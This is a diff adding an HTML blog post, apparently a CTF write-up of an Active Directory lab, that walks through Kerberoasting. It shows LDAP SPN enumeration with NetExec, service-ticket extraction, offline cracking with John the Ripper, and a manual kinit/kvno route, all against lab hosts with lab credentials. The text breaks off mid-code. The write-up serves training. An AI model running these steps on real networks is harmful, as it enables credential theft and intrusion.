@@ -1,0 +1,1409 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Range Village CTF, September 2025</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Range Village CTF, September 2025" />
+<meta name="author" content="Zavier Lee" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://0.0.0.0:4000/rv-sept.html" />
+<meta property="og:url" content="http://0.0.0.0:4000/rv-sept.html" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-09-07T00:00:00-04:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Range Village CTF, September 2025" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Zavier Lee"},"dateModified":"2025-09-07T00:00:00-04:00","datePublished":"2025-09-07T00:00:00-04:00","headline":"Range Village CTF, September 2025","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/rv-sept.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/assets/img/logo.png"},"name":"Zavier Lee"},"url":"http://0.0.0.0:4000/rv-sept.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=1f932773c06b61e9f64bfce4685eaca831277252">
+    <!--[if lt IE 9]>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <![endif]-->
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <div class="wrapper">
+      <header>
+        <h1><a href="http://0.0.0.0:4000/"> </a></h1>
+
+        
+          <img src="/assets/img/logo.png" alt="Logo" />
+        
+
+        <p> </p>
+
+        
+        <p class="view"><a href="https://github.com/ASYNC-Security/async-security.github.io">View the Project on GitHub <small>ASYNC-Security/async-security.github.io</small></a></p>
+        
+
+        
+
+        
+      </header>
+      <section>
+
+      <style>
+    .author-section {
+        padding: 14px;
+        margin: 16px 0;
+        background: rgba(255, 255, 255, 0.02);
+        border: 1px solid #444;
+        border-radius: 6px;
+        position: relative;
+    }
+
+    .author-label {
+        position: absolute;
+        top: -8px;
+        left: 12px;
+        background: #1a1a1a;
+        color: #4da6ff;
+        font-size: 0.75em;
+        font-weight: 600;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+        padding: 0 6px;
+    }
+
+    .author-info {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+    }
+
+    .author-avatar {
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        object-fit: cover;
+        box-shadow: 0 2px 6px rgba(77, 166, 255, 0.2);
+    }
+
+    .author-details {
+        flex: 1;
+    }
+
+    .author-name {
+        font-weight: 600;
+        color: white;
+        margin: 0 0 2px 0;
+        font-size: 0.95em;
+    }
+
+    .author-title {
+        color: #ccc;
+        font-size: 0.8em;
+        margin: 0 0 6px 0;
+        font-style: italic;
+    }
+
+    .author-links {
+        display: flex;
+        gap: 8px;
+    }
+
+    .social-link {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 28px;
+        height: 28px;
+        background: #333;
+        border-radius: 50%;
+        color: #ccc;
+        text-decoration: none;
+        transition: all 0.3s ease;
+        border: 1px solid #444;
+        font-size: 0.7em;
+    }
+
+    .social-link:hover {
+        color: #fff;
+        transform: translateY(-1px);
+        box-shadow: 0 4px 10px rgba(77, 166, 255, 0.3);
+    }
+
+    .post-meta {
+        color: #ccc;
+        font-size: 0.9em;
+        margin-bottom: 12px;
+    }
+
+    .toc-container {
+        margin: 24px 0;
+        background: rgba(255, 255, 255, 0.02);
+        border: 1px solid #444;
+        border-radius: 6px;
+        overflow: hidden;
+    }
+
+    .toc-toggle {
+        background: none;
+        border: none;
+        font-size: 1em;
+        font-weight: 500;
+        cursor: pointer;
+        width: 100%;
+        text-align: left;
+        padding: 16px;
+        color: #fff;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        transition: background-color 0.2s ease;
+    }
+
+    .toc-toggle:hover {
+        background: rgba(255, 255, 255, 0.05);
+    }
+
+    .toc-toggle::after {
+        content: '▼';
+        color: #999;
+        transition: transform 0.3s ease;
+        font-size: 0.8em;
+    }
+
+    .toc-toggle.expanded::after {
+        transform: rotate(180deg);
+    }
+
+    .toc-content {
+        display: none;
+        padding: 0 16px 16px 16px;
+        border-top: 1px solid #333;
+        background: rgba(0, 0, 0, 0.1);
+    }
+
+    .toc-content.expanded {
+        display: block;
+        animation: slideDown 0.3s ease-out;
+    }
+
+    @keyframes slideDown {
+        from {
+            opacity: 0;
+            transform: translateY(-10px);
+        }
+
+        to {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    }
+
+    .toc-container a {
+        color: #ccc;
+        text-decoration: none;
+        transition: color 0.2s ease;
+    }
+
+    .toc-container a:hover {
+        color: #4da6ff;
+        text-decoration: underline;
+    }
+
+    .toc-container ol {
+        margin: 8px 0 0 0;
+        padding-left: 20px;
+        color: #ccc;
+    }
+
+    .toc-container ul {
+        margin: 4px 0;
+        padding-left: 20px;
+        color: #ccc;
+    }
+
+    .toc-container li {
+        margin: 6px 0;
+        line-height: 1.4;
+    }
+
+    .mini-toc {
+        position: fixed;
+        right: 20px;
+        top: 50%;
+        transform: translateY(-50%);
+        width: 280px;
+        max-height: 70vh;
+        background: rgba(26, 26, 26, 0.95);
+        border: 1px solid #444;
+        border-radius: 8px;
+        z-index: 1000;
+        backdrop-filter: blur(10px);
+        opacity: 0;
+        visibility: hidden;
+        transition: all 0.3s ease;
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        display: flex;
+        flex-direction: column;
+    }
+
+    .mini-toc.visible {
+        opacity: 1;
+        visibility: visible;
+    }
+
+    .mini-toc.minimized {
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        max-height: none;
+        overflow: hidden;
+    }
+
+    .mini-toc-header {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 16px;
+        border-bottom: 1px solid #333;
+        flex-shrink: 0;
+    }
+
+    .mini-toc.minimized .mini-toc-header {
+        padding: 8px;
+        border-bottom: none;
+        justify-content: center;
+    }
+
+    .mini-toc-title {
+        font-size: 0.85em;
+        font-weight: 600;
+        color: #4da6ff;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+        margin: 0;
+    }
+
+    .mini-toc.minimized .mini-toc-title {
+        display: none;
+    }
+
+    .mini-toc-minimize {
+        background: none;
+        border: none;
+        color: #999;
+        cursor: pointer;
+        padding: 4px;
+        border-radius: 4px;
+        transition: all 0.2s ease;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 24px;
+        height: 24px;
+    }
+
+    .mini-toc-minimize:hover {
+        color: #4da6ff;
+        background: rgba(77, 166, 255, 0.1);
+    }
+
+    .mini-toc-minimize svg {
+        width: 14px;
+        height: 14px;
+        transition: transform 0.3s ease;
+    }
+
+    .mini-toc.minimized .mini-toc-minimize svg {
+        transform: rotate(180deg);
+    }
+
+    .mini-toc-content {
+        flex: 1;
+        overflow-y: auto;
+        padding: 16px;
+    }
+
+    .mini-toc.minimized .mini-toc-content {
+        display: none;
+    }
+
+    .mini-toc ul, .mini-toc ol {
+        list-style: none;
+        margin: 0;
+        padding: 0;
+    }
+
+    .mini-toc li {
+        margin: 0;
+        padding: 0;
+        font-size: 1.12em;
+    }
+
+    .mini-toc a {
+        display: block;
+        color: #ccc;
+        text-decoration: none;
+        font-size: 0.8em;
+        line-height: 1.5;
+        padding: 6px 0;
+        transition: all 0.2s ease;
+        border-left: 2px solid transparent;
+        padding-left: 12px;
+        margin-left: -12px;
+        border-radius: 0 4px 4px 0;
+    }
+
+    .mini-toc a:hover {
+        color: #4da6ff;
+        border-left-color: #4da6ff;
+        background: rgba(77, 166, 255, 0.05);
+        padding-left: 16px;
+    }
+
+    .mini-toc a.active {
+        color: #4da6ff;
+        border-left-color: #4da6ff;
+        background: rgba(77, 166, 255, 0.1);
+        padding-left: 16px;
+        font-weight: 500;
+    }
+
+    .mini-toc ul ul,
+    .mini-toc ol ol,
+    .mini-toc ul ol,
+    .mini-toc ol ul {
+        margin-left: 16px;
+        margin-top: 4px;
+        margin-bottom: 4px;
+        border-left: 1px solid rgba(255, 255, 255, 0.1);
+        padding-left: 8px;
+    }
+
+    .mini-toc ul ul a,
+    .mini-toc ol ol a,
+    .mini-toc ul ol a,
+    .mini-toc ol ul a {
+        font-size: 0.75em;
+        opacity: 0.9;
+    }
+
+    .mini-toc ul ul ul a,
+    .mini-toc ol ol ol a,
+    .mini-toc ul ol ol a,
+    .mini-toc ol ul ul a {
+        font-size: 0.7em;
+        opacity: 0.8;
+    }
+
+    .mini-toc-content::-webkit-scrollbar {
+        width: 4px;
+    }
+
+    .mini-toc-content::-webkit-scrollbar-track {
+        background: rgba(255, 255, 255, 0.05);
+        border-radius: 2px;
+    }
+
+    .mini-toc-content::-webkit-scrollbar-thumb {
+        background: #4da6ff;
+        border-radius: 2px;
+    }
+
+    .mini-toc-content::-webkit-scrollbar-thumb:hover {
+        background: #66b3ff;
+    }
+
+    @media (max-width: 962px) {
+        .toc-container {
+            margin: 16px 0;
+        }
+
+        .toc-toggle {
+            padding: 12px;
+            font-size: 0.95em;
+        }
+
+        .toc-content {
+            padding: 0 12px 12px 12px;
+        }
+
+        .mini-toc {
+            display: none;
+        }
+    }
+
+    @media (max-width: 1400px) {
+        .mini-toc {
+            right: 10px;
+            width: 260px;
+        }
+    }
+
+    @media (max-width: 1200px) {
+        .mini-toc {
+            width: 240px;
+        }
+    }
+
+    @media (max-width: 962px) {
+        .author-section {
+            margin: 16px 0;
+            padding: 16px;
+            border-radius: 6px;
+        }
+
+        .author-label {
+            top: -8px;
+            left: 12px;
+            font-size: 0.8em;
+        }
+
+        .author-info {
+            gap: 12px;
+        }
+
+        .author-avatar {
+            width: 48px;
+            height: 48px;
+            border-width: 2px;
+        }
+
+        .author-name {
+            font-size: 1em;
+        }
+
+        .author-title {
+            font-size: 0.9em;
+        }
+
+        .author-links {
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .post-meta {
+            margin-bottom: 8px;
+        }
+
+        h1 {
+            margin-top: 0;
+            margin-bottom: 10px;
+        }
+
+        section {
+            padding-top: 0 !important;
+        }
+
+        hr {
+            display: none;
+        }
+    }
+
+    .post-header {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        margin-bottom: 28px;
+        flex-wrap: wrap;
+        gap: 12px;
+    }
+
+    .back-button {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        padding: 8px 12px;
+        background: rgba(255, 255, 255, 0.05);
+        border: 1px solid #444;
+        border-radius: 20px;
+        color: #ccc;
+        text-decoration: none;
+        font-size: 0.85em;
+        font-weight: 500;
+        transition: all 0.3s ease;
+        width: fit-content;
+        outline: none;
+    }
+
+    .back-button:hover {
+        background: rgba(255, 255, 255, 0.08);
+        color: #4da6ff;
+        border-color: #4da6ff;
+        transform: translateY(-1px);
+        box-shadow: 0 2px 8px rgba(77, 166, 255, 0.2);
+        outline: none;
+    }
+
+    .back-button:focus {
+        outline: none;
+        box-shadow: 0 0 0 2px rgba(77, 166, 255, 0.3);
+    }
+
+    .back-button svg {
+        width: 14px;
+        height: 14px;
+        transition: transform 0.3s ease;
+    }
+
+    .back-button:hover svg {
+        transform: translateX(-2px);
+    }
+
+    .post-meta {
+        color: #999;
+        font-size: 0.85em;
+        padding: 6px 12px;
+        background: rgba(255, 255, 255, 0.03);
+        border: 1px solid rgba(255, 255, 255, 0.08);
+        border-radius: 12px;
+        display: inline-block;
+        font-weight: 500;
+        letter-spacing: 0.3px;
+        margin: 0;
+    }
+
+    @media (max-width: 962px) {
+        .post-header {
+            flex-direction: column;
+            align-items: flex-start;
+            margin-bottom: 24px;
+            gap: 8px;
+        }
+
+        .back-button {
+            margin-top: 12px;
+            padding: 6px 10px;
+            font-size: 0.8em;
+        }
+
+        .back-button svg {
+            width: 12px;
+            height: 12px;
+        }
+
+        .post-meta {
+            font-size: 0.8em;
+            padding: 5px 10px;
+        }
+    }
+</style>
+
+<div class="post-header">
+    <a href="/" class="back-button">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
+            <path fill-rule="evenodd"
+                d="M15 8a.5.5 0 0 0-.5-.5H2.707l3.147-3.146a.5.5 0 1 0-.708-.708l-4 4a.5.5 0 0 0 0 .708l4 4a.5.5 0 0 0 .708-.708L2.707 8.5H14.5A.5.5 0 0 0 15 8z" />
+        </svg>
+        Back
+    </a>
+
+    
+    <small class="post-meta">7 September 2025</small>
+    
+</div>
+
+
+
+
+
+<div class="author-section">
+    <div class="author-label">Author</div>
+    <div class="author-info">
+        
+        <img src="./assets/img/authors/zavier.png" alt="Zavier Lee" class="author-avatar">
+        
+        <div class="author-details">
+            <div class="author-name">Zavier Lee</div>
+            
+            <div class="author-title">Offensive Security Engineer</div>
+            
+            <div class="author-links">
+                
+                <a href="https://x.com/gatariee" target="_blank" class="social-link twitter" aria-label="Twitter">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
+                        class="bi bi-twitter-x" viewBox="0 0 16 16">
+                        <path
+                            d="M12.6.75h2.454l-5.36 6.142L16 15.25h-4.937l-3.867-5.07-4.425 5.07H.316l5.733-6.57L0 .75h5.063l3.495 4.633L12.601.75Zm-.86 13.028h1.36L4.323 2.145H2.865z" />
+                    </svg>
+                </a>
+                
+                
+                <a href="https://github.com/gatariee" target="_blank" class="social-link github" aria-label="GitHub">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                        <path
+                            d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z" />
+                    </svg>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<div class="mini-toc" id="miniToc">
+    <div class="mini-toc-header">
+        <div class="mini-toc-title">Contents</div>
+        <button class="mini-toc-minimize" onclick="toggleMiniToc()" aria-label="Minimize TOC">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M1 8a.5.5 0 0 1 .5-.5h13a.5.5 0 0 1 0 1h-13A.5.5 0 0 1 1 8zM7.646 4.146a.5.5 0 0 1 .708 0l2 2a.5.5 0 0 1-.708.708L8.5 5.707V11.5a.5.5 0 0 1-1 0V5.707L6.354 6.854a.5.5 0 1 1-.708-.708l2-2z"/>
+            </svg>
+        </button>
+    </div>
+    <div class="mini-toc-content" id="miniTocContent"></div>
+</div>
+
+<h1 id="range-village-ctf-september-2025">Range Village CTF, September 2025</h1>
+
+<p>Last weekend, we sponsored an Active Directory lab that was showcased during the <a href="https://www.meetup.com/div0_sg/events/310625377/">September Range Village Meetup</a>, hosted by <a href="https://www.div0.sg/">Division Zero (Div0)</a> and the <a href="https://www.linkedin.com/company/the-range-village/">Range Village crew</a>. The event was a great success, with close to 40 participants joining us for an evening of learning and fun!</p>
+
+<p>This blog post provides an overview of the lab, including the challenges, statistics, and solutions for each flag. There are multiple solutions for some of the flags, so if you have done the lab - do look out for the alternative methods covered in this post!</p>
+
+<div class="toc-container">
+  <button class="toc-toggle" onclick="toggleToc()">Table of Contents</button>
+  <div class="toc-content" id="tocContent">
+    <ol>
+      <li>
+        <a href="#range-village-ctf-september-2025">Range Village CTF, September 2025</a>
+        <ul>
+          <li><a href="#challenge-overview">Challenge Overview</a></li>
+          <li><a href="#solve-statistics">Solve Statistics</a></li>
+        </ul>
+      </li>
+      <li>
+        <a href="#flag-1-and-so-it-begins">And, so it begins...</a>
+        <ul>
+            <li><a href="#path-1-kerberoasting">Kerberoasting</a></li>
+                <ul>
+                    <li><a href="#roasting-the-easy-way">Roasting (The Easy Way)</a></li>
+                    <li><a href="#roasting-the-hard-way">Roasting (The Hard Way)</a></li>
+                </ul>
+            <li><a href="#path-2-cross-forest-enumeration">Cross-Forest Enumeration</a></li>
+            <li><a href="#looting-shares">Looting Shares</a></li>
+        </ul>
+      </li>
+      <li>
+        <a href="#flag-2-access-uncontrolled">Access (Un)controlled</a>
+            <ul>
+                <li><a href="#identifying-privileged-groups">Identifying Privileged Groups</a></li>
+                <li><a href="#machineaccountquota">MachineAccountQuota</a></li>
+                <li><a href="#abusing-genericall-on-group">Abusing GenericAll on Group</a></li>
+            </ul>
+      </li>
+    </ol>
+  </div>
+</div>
+
+<h2 id="challenge-overview">Challenge Overview</h2>
+
+<p>The lab was designed to simulate a real-world Active Directory environment, while also being beginner-friendly. There were a total of 8 flags, across 4 machines and 2 domains, with a mix of easy and challenging flags to cater to participants of all skill levels. The lab was structured to encourage collaboration and teamwork, with participants working together to solve the challenges and capture the flags.</p>
+
+<p><img src="/assets/img/rv-sept/challenges.png" alt="challenges" /></p>
+
+<p>The lab featured 2 domains: <code class="language-plaintext highlighter-rouge">antennae.rv</code> and <code class="language-plaintext highlighter-rouge">backward.rv</code> - and 4 machines: <code class="language-plaintext highlighter-rouge">dc01.antennae.rv</code>, <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code>, <code class="language-plaintext highlighter-rouge">dc02.backward.rv</code> and <code class="language-plaintext highlighter-rouge">srv01.backward.rv</code>. The following credentials were provided to all participants at the start of the event to simulate an <a href="https://trustedsec.com/blog/assumed-breach-the-evolution-of-offensive-security-testing">assumed breach scenario</a>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User: chloe.lim@antennae.rv
+Password: BZCJsopuOPgH
+</code></pre></div></div>
+
+<h2 id="solve-statistics">Solve Statistics</h2>
+
+<p>A total of 26 participants captured at least one flag, with only one person successfully completing the entire lab by capturing all 8 flags. The <code class="language-plaintext highlighter-rouge">Silver</code> challenge proved to be the most difficult, showing a sharp decline in solves - from 12 for the <code class="language-plaintext highlighter-rouge">Historical Scar</code> challenge down to just 4 for <code class="language-plaintext highlighter-rouge">Silver</code>.</p>
+
+<p><img src="/assets/img/rv-sept/solves.png" alt="stats" /></p>
+
+<p>Overall, the lab was a great success, with participants enjoying the challenges and learning new skills. The feedback received was overwhelmingly positive, with many participants expressing their appreciation for the opportunity to learn and collaborate in a supportive environment. We would like to extend our gratitude to <a href="https://www.div0.sg/">Div0</a> and <a href="https://www.linkedin.com/company/the-range-village/">Range Village</a> for hosting the event, and we look forward to sponsoring more events in the future!</p>
+
+<h1 id="flag-1-and-so-it-begins">Flag 1: And, so it begins…</h1>
+
+<p><img src="/assets/img/rv-sept/1.png" alt="" /></p>
+
+<h2 id="path-1-kerberoasting">Path 1: Kerberoasting</h2>
+
+<p>Using the given credentials for <code class="language-plaintext highlighter-rouge">chloe.lim@antennae.rv</code>, we can start by enumerating the <code class="language-plaintext highlighter-rouge">antennae.rv</code> domain and identifying users with <a href="https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names">Service Principal Names (SPNs)</a> set.</p>
+
+<p>We can achieve this using an <code class="language-plaintext highlighter-rouge">LDAP</code> query with <a href="https://www.netexec.wiki/ldap-protocol/query-ldap">NetExec’s</a> <code class="language-plaintext highlighter-rouge">LDAP</code> flag, we’ll find a couple of users with SPNs set:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc01.antennae.rv -u 'chloe.lim' -p 'BZCJsopuOPgH' --query "(&amp;(objectClass=user)(servicePrincipalName=*))" "samAccountName servicePrincipalName"
+
+LDAP        10.5.10.10      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:antennae.rv) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.5.10.10      389    DC01             [+] antennae.rv\chloe.lim:BZCJsopuOPgH 
+
+LDAP        10.5.10.10      389    DC01             [+] Response for object: CN=svc_vdi,CN=Users,DC=antennae,DC=rv
+LDAP        10.5.10.10      389    DC01             sAMAccountName       svc_vdi
+LDAP        10.5.10.10      389    DC01             servicePrincipalName HORIZON/VirtualDesktop
+LDAP        10.5.10.10      389    DC01                                  TERMSRV/vdi.antennae.rv
+LDAP        10.5.10.10      389    DC01                                  HTTPS/vdi.antennae.rv
+LDAP        10.5.10.10      389    DC01                                  HORIZON/vdi
+LDAP        10.5.10.10      389    DC01                                  HORIZON/vdi.antennae.rv
+LDAP        10.5.10.10      389    DC01             [+] Response for object: CN=svc_sql,CN=Users,DC=antennae,DC=rv
+LDAP        10.5.10.10      389    DC01             sAMAccountName       svc_sql
+LDAP        10.5.10.10      389    DC01             servicePrincipalName MSSQLSvc/sql01.antennae.rv:1433
+LDAP        10.5.10.10      389    DC01                                  MSSQLSvc/sql01.antennae.rv
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">servicePrincipalName</code> format generally follows the pattern of <code class="language-plaintext highlighter-rouge">service/hostname:port</code> or <code class="language-plaintext highlighter-rouge">service/hostname</code>, indicating the service type and the host it is associated with. In this case, we have two users with SPNs set: <code class="language-plaintext highlighter-rouge">svc_vdi</code> and <code class="language-plaintext highlighter-rouge">svc_sql</code>. Based on the SPNs, we can infer that <code class="language-plaintext highlighter-rouge">svc_vdi</code> is likely associated with a <a href="https://azure.microsoft.com/en-us/resources/cloud-computing-dictionary/what-is-virtual-desktop-infrastructure-vdi">Virtual Desktop Infrastructure (VDI)</a> service running on <code class="language-plaintext highlighter-rouge">vdi.antennae.rv</code>, while <code class="language-plaintext highlighter-rouge">svc_sql</code> is associated with a <a href="https://www.microsoft.com/en-us/sql-server/sql-server-downloads">Microsoft SQL Server</a> service running on <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code> on the default SQL port <code class="language-plaintext highlighter-rouge">1433</code>.</p>
+
+<p>We can perform a <a href="https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/kerberoasting/">Kerberoasting</a> attack on either of these users to obtain an encrypted service ticket for their respective services. These tickets will be encrypted with the service account’s password, which we can then attempt to crack offline.</p>
+
+<blockquote>
+  <p>Kerberoasting is not inherently malicious, requesting service tickets for services is an integral part of Kerberos. This technique only becomes lucrative when the service account is using a weak password.</p>
+</blockquote>
+
+<h3 id="roasting-the-easy-way">Roasting (The Easy Way)</h3>
+
+<p>We can request service tickets for both users using <a href="https://www.netexec.wiki/ldap-protocol/kerberoasting">NetExec</a>, and write the output to a file called <code class="language-plaintext highlighter-rouge">service_tickets.txt</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc01.antennae.rv -u 'chloe.lim' -p 'BZCJsopuOPgH' --kerberoasting service_tickets.txt                                                           
+LDAP        10.5.10.10      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:antennae.rv) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.5.10.10      389    DC01             [+] antennae.rv\chloe.lim:BZCJsopuOPgH 
+LDAP        10.5.10.10      389    DC01             [*] Skipping disabled account: krbtgt
+LDAP        10.5.10.10      389    DC01             [*] Total of records returned 2
+LDAP        10.5.10.10      389    DC01             [*] sAMAccountName: svc_vdi, memberOf: CN=Service Accounts,CN=Users,DC=antennae,DC=rv, pwdLastSet: 2025-08-28 15:16:57.992825, lastLogon: 2025-08-28 15:17:30.758637
+LDAP        10.5.10.10      389    DC01             $krb5tgs$23$*svc_vdi$ANTENNAE.RV$antennae.rv\svc_vdi*$1b38c1a87120eefcd7717394fbb96d[....snip...]dc5aa8d0085bbebc39e64c248495570f61b5e1a157
+LDAP        10.5.10.10      389    DC01             [*] sAMAccountName: svc_sql, memberOf: CN=Service Accounts,CN=Users,DC=antennae,DC=rv, pwdLastSet: 2025-08-28 15:16:58.149076, lastLogon: 2025-08-30 07:37:42.373093
+LDAP        10.5.10.10      389    DC01             $krb5tgs$23$*svc_sql$ANTENNAE.RV$antennae.rv\svc_sql*$a66fad26fc10f1372475[...snip...]0eace690f78af8994cc2d7338f0bbc79ee152ab5cb6
+</code></pre></div></div>
+
+<p>Next, we can attempt to crack these service tickets using <a href="https://www.openwall.com/john/">John the Ripper</a> with the <a href="https://weakpass.com/wordlists/rockyou.txt">rockyou.txt</a> wordlist.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ john --wordlist=/usr/share/wordlists/rockyou.txt service_tickets.txt 
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+tr4v15           (?)     
+</code></pre></div></div>
+
+<p>We get a hit on one of the service tickets, after trying the password for both <code class="language-plaintext highlighter-rouge">svc_vdi</code> and <code class="language-plaintext highlighter-rouge">svc_sql</code>, we find that the cracked password <code class="language-plaintext highlighter-rouge">tr4v15</code> belongs to the <code class="language-plaintext highlighter-rouge">svc_vdi</code> account.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc01.antennae.rv -u 'svc_vdi' -p 'tr4v15'                                            
+LDAP        10.5.10.10      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:antennae.rv) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.5.10.10      389    DC01             [+] antennae.rv\svc_vdi:tr4v15
+</code></pre></div></div>
+
+<h3 id="roasting-the-hard-way">Roasting (The Hard Way)</h3>
+
+<p>We can explicitly request a service ticket for <code class="language-plaintext highlighter-rouge">TERMSRV/vdi.antennae.rv</code> using <code class="language-plaintext highlighter-rouge">kinit</code> and <code class="language-plaintext highlighter-rouge">kvno</code>, which are part of the <a href="https://web.mit.edu/kerberos/">Kerberos</a> suite of tools. Firstly, we need to grab a <code class="language-plaintext highlighter-rouge">Ticket Granting Ticket (TGT)</code> for <code class="language-plaintext highlighter-rouge">chloe.lim</code> using <code class="language-plaintext highlighter-rouge">kinit</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ echo 'BZCJsopuOPgH' | kinit 'chloe.lim'@ANTENNAE.RV
+Password for chloe.lim@ANTENNAE.RV: 
+
+~$ klist
+Ticket cache: FILE:/tmp/krb5cc_1000
+Default principal: chloe.lim@ANTENNAE.RV
+
+Valid starting       Expires              Service principal
+09/07/2025 08:45:27  09/07/2025 18:45:27  krbtgt/ANTENNAE.RV@ANTENNAE.RV
+        renew until 09/08/2025 08:45:27
+</code></pre></div></div>
+
+<p>We can then use <code class="language-plaintext highlighter-rouge">kvno</code> to request a service ticket for <code class="language-plaintext highlighter-rouge">TERMSRV/vdi.antennae.rv</code>, which will be added to our existing ticket cache:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ kvno TERMSRV/vdi.antennae.rv
+TERMSRV/vdi.antennae.rv@ANTENNAE.RV: kvno = 2
+
+~$ klist                       
+Ticket cache: FILE:/tmp/krb5cc_1000
+Default principal: chloe.lim@ANTENNAE.RV
+
+Valid starting       Expires              Service principal
+09/07/2025 08:45:27  09/07/2025 18:45:27  krbtgt/ANTENNAE.RV@ANTENNAE.RV
+        renew until 09/08/2025 08:45:27
+09/07/2025 08:46:21  09/07/2025 18:45:27  TERMSRV/vdi.antennae.rv@ANTENNAE.RV
+        renew until 09/08/2025 08:45:27
+</code></pre></div></div>
+
+<p>In order to extract the service ticket from our ticket cache, we can use <code class="language-plaintext highlighter-rouge">describeTicket.py</code> from the <a href="https://github.com/fortra/impacket">Impacket</a> toolkit which exposes the <code class="language-plaintext highlighter-rouge">kerberoast_from_ccache</code> functionality:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># https://github.com/fortra/impacket/blob/master/examples/describeTicket.py#L684
+</span><span class="k">def</span> <span class="nf">kerberoast_from_ccache</span><span class="p">(</span><span class="n">decodedTGS</span><span class="p">,</span> <span class="n">spn</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">domain</span><span class="p">):</span>
+    <span class="p">...</span>
+    <span class="k">if</span> <span class="n">decodedTGS</span><span class="p">[</span><span class="s">'ticket'</span><span class="p">][</span><span class="s">'enc-part'</span><span class="p">][</span><span class="s">'etype'</span><span class="p">]</span> <span class="o">==</span> <span class="n">constants</span><span class="p">.</span><span class="n">EncryptionTypes</span><span class="p">.</span><span class="n">rc4_hmac</span><span class="p">.</span><span class="n">value</span><span class="p">:</span>
